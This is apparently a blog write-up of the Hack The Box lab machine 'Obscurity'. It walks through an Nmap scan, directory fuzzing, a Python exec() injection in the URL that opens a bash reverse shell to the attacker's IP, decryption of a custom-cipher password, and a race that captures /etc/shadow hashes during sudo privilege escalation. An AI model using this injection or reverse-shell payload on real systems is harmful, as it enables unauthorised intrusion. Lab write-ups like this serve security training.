---
title:     "Hack The Box - Obscurity"
tags: [linux,medium,python,sudo]
layout: post
categories : HackTheBox
---

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-obscurity/1.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-obscurity/1.png)

We are going to pwn Obscurity from Hack The Box.

Link : [https://www.hackthebox.eu/home/machines/profile/219](https://www.hackthebox.eu/home/machines/profile/219)

Like always begin with our Nmap Scan.

## Nmap Scan Results:

```bash
PORT     STATE  SERVICE
22/tcp   open   ssh
80/tcp   closed http
8080/tcp open   http-proxy
9000/tcp closed cslistener

PORT     STATE  SERVICE    VERSION
22/tcp   open   ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 33:d3:9a:0d:97:2c:54:20:e1:b0:17:34:f4:ca:70:1b (RSA)
|   256 f6:8b:d5:73:97:be:52:cb:12:ea:8b:02:7c:34:a3:d7 (ECDSA)
|_  256 e8:df:55:78:76:85:4b:7b:dc:70:6a:fc:40:cc:ac:9b (ED25519)
80/tcp   closed http
8080/tcp open   http-proxy BadHTTPServer
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Mon, 13 Jan 2020 04:51:30
|     Server: BadHTTPServer
|     Last-Modified: Mon, 13 Jan 2020 04:51:30
|     Content-Length: 4171
|     Content-Type: text/html
|     Connection: Closed
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>0bscura</title>
|     <meta http-equiv="X-UA-Compatible" content="IE=Edge">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <meta name="keywords" content="">
|     <meta name="description" content="">
|     <!-- 
|     Easy Profile Template
|     http://www.templatemo.com/tm-467-easy-profile
|     <!-- stylesheet css -->
|     <link rel="stylesheet" href="css/bootstrap.min.css">
|     <link rel="stylesheet" href="css/font-awesome.min.css">
|     <link rel="stylesheet" href="css/templatemo-blue.css">
|     </head>
|     <body data-spy="scroll" data-target=".navbar-collapse">
|     <!-- preloader section -->
|     <!--
|     <div class="preloader">
|     <div class="sk-spinner sk-spinner-wordpress">
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Mon, 13 Jan 2020 04:51:31
|     Server: BadHTTPServer
|     Last-Modified: Mon, 13 Jan 2020 04:51:31
|     Content-Length: 4171
|     Content-Type: text/html
|     Connection: Closed
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>0bscura</title>
|     <meta http-equiv="X-UA-Compatible" content="IE=Edge">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <meta name="keywords" content="">
|     <meta name="description" content="">
|     <!-- 
|     Easy Profile Template
|     http://www.templatemo.com/tm-467-easy-profile
|     <!-- stylesheet css -->
|     <link rel="stylesheet" href="css/bootstrap.min.css">
|     <link rel="stylesheet" href="css/font-awesome.min.css">
|     <link rel="stylesheet" href="css/templatemo-blue.css">
|     </head>
|     <body data-spy="scroll" data-target=".navbar-collapse">
|     <!-- preloader section -->
|     <!--
|     <div class="preloader">
|_    <div class="sk-spinner sk-spinner-wordpress">
|_http-server-header: BadHTTPServer
|_http-title: 0bscura
9000/tcp closed cslistener
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.80%I=7%D=1/13%Time=5E1BF72E%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,10FC,"HTTP/1\.1\x20200\x20OK\nDate:\x20Mon,\x2013\x20Jan\x2020
SF:20\x2004:51:30\nServer:\x20BadHTTPServer\nLast-Modified:\x20Mon,\x2013\
SF:x20Jan\x202020\x2004:51:30\nContent-Length:\x204171\nContent-Type:\x20t
SF:ext/html\nConnection:\x20Closed\n\n<!DOCTYPE\x20html>\n<html\x20lang=\"
SF:en\">\n<head>\n\t<meta\x20charset=\"utf-8\">\n\t<title>0bscura</title>\
SF:n\t<meta\x20http-equiv=\"X-UA-Compatible\"\x20content=\"IE=Edge\">\n\t<
SF:meta\x20name=\"viewport\"\x20content=\"width=device-width,\x20initial-s
SF:cale=1\">\n\t<meta\x20name=\"keywords\"\x20content=\"\">\n\t<meta\x20na
SF:me=\"description\"\x20content=\"\">\n<!--\x20\nEasy\x20Profile\x20Templ
SF:ate\nhttp://www\.templatemo\.com/tm-467-easy-profile\n-->\n\t<!--\x20st
SF:ylesheet\x20css\x20-->\n\t<link\x20rel=\"stylesheet\"\x20href=\"css/boo
SF:tstrap\.min\.css\">\n\t<link\x20rel=\"stylesheet\"\x20href=\"css/font-a
SF:wesome\.min\.css\">\n\t<link\x20rel=\"stylesheet\"\x20href=\"css/templa
SF:temo-blue\.css\">\n</head>\n<body\x20data-spy=\"scroll\"\x20data-target
SF:=\"\.navbar-collapse\">\n\n<!--\x20preloader\x20section\x20-->\n<!--\n<
SF:div\x20class=\"preloader\">\n\t<div\x20class=\"sk-spinner\x20sk-spinner
SF:-wordpress\">\n")%r(HTTPOptions,10FC,"HTTP/1\.1\x20200\x20OK\nDate:\x20
SF:Mon,\x2013\x20Jan\x202020\x2004:51:31\nServer:\x20BadHTTPServer\nLast-M
SF:odified:\x20Mon,\x2013\x20Jan\x202020\x2004:51:31\nContent-Length:\x204
SF:171\nContent-Type:\x20text/html\nConnection:\x20Closed\n\n<!DOCTYPE\x20
SF:html>\n<html\x20lang=\"en\">\n<head>\n\t<meta\x20charset=\"utf-8\">\n\t
SF:<title>0bscura</title>\n\t<meta\x20http-equiv=\"X-UA-Compatible\"\x20co
SF:ntent=\"IE=Edge\">\n\t<meta\x20name=\"viewport\"\x20content=\"width=dev
SF:ice-width,\x20initial-scale=1\">\n\t<meta\x20name=\"keywords\"\x20conte
SF:nt=\"\">\n\t<meta\x20name=\"description\"\x20content=\"\">\n<!--\x20\nE
SF:asy\x20Profile\x20Template\nhttp://www\.templatemo\.com/tm-467-easy-pro
SF:file\n-->\n\t<!--\x20stylesheet\x20css\x20-->\n\t<link\x20rel=\"stylesh
SF:eet\"\x20href=\"css/bootstrap\.min\.css\">\n\t<link\x20rel=\"stylesheet
SF:\"\x20href=\"css/font-awesome\.min\.css\">\n\t<link\x20rel=\"stylesheet
SF:\"\x20href=\"css/templatemo-blue\.css\">\n</head>\n<body\x20data-spy=\"
SF:scroll\"\x20data-target=\"\.navbar-collapse\">\n\n<!--\x20preloader\x20
SF:section\x20-->\n<!--\n<div\x20class=\"preloader\">\n\t<div\x20class=\"s
SF:k-spinner\x20sk-spinner-wordpress\">\n");
Aggressive OS guesses: Linux 3.2 - 4.9 (94%), Linux 3.1 (93%), Linux 3.2 (93%), Linux 3.18 (92%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (92%), Linux 3.16 (91%), Oracle VM Server 3.4.2 (Linux 4.1) (91%), Crestron XPanel control system (91%), Android 4.1.1 (91%), Android 4.2.2 (Linux 3.4) (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kern
```

Nmap dump some unusual things.

## HTTP Enumeration

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-obscurity/2.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-obscurity/2.png)

There is a message for us

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-obscurity/3.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-obscurity/3.png)

So there is a python script in the secret development directory.

So I tried Bruteforcing the webpage

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-obscurity/4.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-obscurity/4.png)

Nothing!

## Fuzzing Directories

Since it doesn't give me anything useful, we know the script name `SuperSecureServer.py` so I tried [Wfuzz](https://github.com/xmendez/wfuzz).

> wfuzz - a web application brute forcer.

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-obscurity/5.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-obscurity/5.png)

```bash
--hc/hl/hw/hh N[,N]+
              Hide  responses  with  the specified code/lines/words/chars (Use
              BBB for taking values from baseline)

-c     Output with colors
```

By using `FUZZ` before `SuperSecureServer.py` will Bruteforce that particular target.
We found the folder is `/develop/`

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-obscurity/6.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-obscurity/6.png)

I downloaded that script to my machine. And while checking the script I found `exec()`.

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-obscurity/7.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-obscurity/7.png)

> exec supports the dynamic execution of Python code. The first expression should evaluate to either a string, an open file object, or a code object. If it is a string, the string is parsed as a suite of Python statements which is then executed (unless a syntax error occurs). If it is an open file, the file is parsed until EOF and executed. If it is a code object, it is simply executed.

> For more Details: [https://www.geeksforgeeks.org/exec-in-python/https://www.geeksforgeeks.org/exec-in-python/](https://www.geeksforgeeks.org/exec-in-python/https://www.geeksforgeeks.org/exec-in-python/)

So this is where we need to inject our payload, we need to escape the format first.
By using `;` before our payload that will end `exec()` and start executes our payload.
I googled about how to exploit exec and found this!!

>[https://medium.com/swlh/hacking-python-applications-5d4cd541b3f1](https://medium.com/swlh/hacking-python-applications-5d4cd541b3f1)

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-obscurity/8.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-obscurity/8.png)

Using the article I created mine, At first, I tried without `bash -c` but that didn't work but when I tried this, it worked.
I send `'` as the string which it is expecting from us.

```py
`10.10.10.168:8080/';__import__("os").system("bash -c 'bash -i >& /dev/tcp/10.10.14.31/1234 0>&1'")%23`
```

## Shell as www-data

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-obscurity/9.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-obscurity/9.png)

We got the shell!!

There is a user `robert` while checking his home directory. Found some files.

```bash
www-data@obscure:/home/robert$ ls
ls
BetterSSH
check.txt
out.txt
passwordreminder.txt
SuperSecureCrypt.py
user.txt
```

## Analysing the Python Script

I used `-h` to get the usage of `SuperSecureCrypt.py` and it do some encryption and decryption using a key.

```bash
python3 SuperSecureCrypt.py -h
usage: SuperSecureCrypt.py [-h] [-i InFile] [-o OutFile] [-k Key] [-d]

Encrypt with 0bscura's encryption algorithm

optional arguments:
  -h, --help  show this help message and exit
  -i InFile   The file to read
  -o OutFile  Where to output the encrypted/decrypted file
  -k Key      Key to use
  -d          Decrypt mode
```

So this is how it works!

I started checking other files in that directory.

```bash
www-data@obscure:/home/robert$ cat check.txt
cat check.txt
Encrypting this file with your key should result in out.txt, make sure your key is correct!
```

```bash
www-data@obscure:/home/robert$ cat passwordreminder.txt
cat passwordreminder.txt
´ÑÈÌÉàÙÁÑé¯·¿k
```

```python
www-data@obscure:/home/robert$ cat out.txt
cat out.txt
¦ÚÈêÚÞØÛÝÝ	×ÐÊß
ÞÊÚÉæßÝËÚÛÚêÙÉëéÑÒÝÍÐ
êÆáÙÞãÒÑÐáÙ¦ÕæØãÊÎÍßÚêÆÝáäè	ÎÍÚÎëÑÓäáÛÌ×
```

Only check.txt file is in readable format, Others not!
So We already know that the script needs `a key` and `a file` that needs to be encrypted/decrypt and a path to store the output.

I assumed this is what happened so far, `check.txt` is the key.

### Encode

```
<message> + check.txt  >> Encryption script >> out.txt 
Password + <message> >> Encryption script >> passwordreminder.txt
```

Now we need to revert this.

### Decode

```
out.key + check.txt >> Decryption script >> <message>
passwordreminder.txt + <message> >> Decryption script >> Password
```

## Playing with the Python Script

```python
python3 SuperSecureCrypt.py -i out.txt -k "Encrypting this file with your key should result in out.txt, make sure your key is correct!" -o /tmp/key1 -d
```

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-obscurity/10.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-obscurity/10.png)

```python
python3 SuperSecureCrypt.py -i passwordreminder.txt -k "alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovich" -o /tmp/key2 -d
```

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-obscurity/11.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-obscurity/11.png)

Got `SecThruObsFTW` maybe it will be robert's password.

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-obscurity/12.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-obscurity/12.png)

## Privilege Escalation

Like always I started with `sudo -l`

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-obscurity/13.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-obscurity/13.png)

So we can run `[BetterSSH.py](http://betterssh.py)` as Root without password.

Let's Check the script, 

```python
session['user'] = input("Enter username: ")
    passW = input("Enter password: ")

    with open('/etc/shadow', 'r') as f:
        data = f.readlines()
    data = [(p.split(":") if "$" in p else None) for p in data]
    passwords = []
    for x in data:
        if not x == None:
            passwords.append(x)

    passwordFile = '\n'.join(['\n'.join(p) for p in passwords]) 
    with open('/tmp/SSH/'+path, 'w') as f:
        f.write(passwordFile)
    time.sleep(.1)
    salt = ""
    realPass = ""
    for p in passwords:
        if p[0] == session['user']:
            salt, realPass = p[1].split('$')[2:]
            break
```

The script first checks the user we give in `/etc/shadow` if the user is correct, It moves to the password we gave.
While Checking it writes the `/etc/shadow` in `/tmp/SSH` and then it cross-checks with what we gave.
So we need to capture the hash at that time!

So I opened 2 terminal one which runs the script and another to capture the hash in `/tmp/SSH`
We need root password so I gave root as username and a random password.

```bash
while sleep 0.1; do cat /tmp/SSH/* 2>/dev/null; done
```

> sleep - delay for a specified amount of time

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-obscurity/14.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-obscurity/14.png)

Got the hash.

I cracked the hash using john

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-obscurity/15.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-obscurity/15.png)

`root : mercedes`

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-obscurity/16.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-obscurity/16.png)

We are now root!!